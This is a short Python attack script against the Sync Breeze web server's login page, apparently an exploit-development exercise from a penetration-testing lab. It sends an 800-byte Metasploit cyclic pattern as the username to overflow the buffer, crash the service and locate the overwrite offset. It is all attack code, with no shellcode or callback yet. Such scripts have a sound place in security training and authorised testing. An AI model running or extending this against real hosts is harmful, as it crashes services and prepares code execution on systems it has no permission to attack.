#!/usr/bin/python3
#
# Sync breeze buffer overflow

import requests
import argparse
import subprocess

# Script arguments
parser = argparse.ArgumentParser(description='Sync breeze buffer overflow')
parser.add_argument('host', help='host to target')
args = parser.parse_args()

url = f"http://{args.host}/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Origin": "http://192.168.199.10",
    "Referer": "http://192.168.199.10/login",
    "Upgrade-Insecure-Requests": "1",
}

print(f"starting overflow on {url}")
shresult = subprocess.run(["msf-pattern_create", "-l", "800"], capture_output=True)
if shresult.returncode == 0:
    username = shresult.stdout.decode()[:-1]
    data = {
        "username": username,
        "password": "something"
    }
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        print("received response, overflow failed")
    except requests.exceptions.ReadTimeout:
        print("request timed out")
else:
    print("failed to retrieve overflow pattern")